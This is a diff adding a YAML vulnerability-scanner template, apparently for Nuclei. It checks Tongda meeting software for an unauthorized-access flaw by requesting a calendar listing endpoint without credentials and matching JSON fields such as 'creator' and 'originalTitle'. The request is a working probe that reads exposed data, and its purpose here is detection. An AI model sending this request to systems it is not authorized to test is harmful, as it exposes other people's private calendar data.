@@ -1,0 +1,30 @@
+id: poc-yaml-tongda-meeting-unauthorized-access
+info:
+  name: Tongda Meeting Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control
+  description: |
+    This template checks for unauthorized access vulnerability in Tongda Meeting application.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=33165447106&view=agendaDay"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
+      Accept-Encoding: deflate
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+          - "json"
+      - type: word
+        part: body
+        words:
+          - "creator"
+          - "originalTitle"
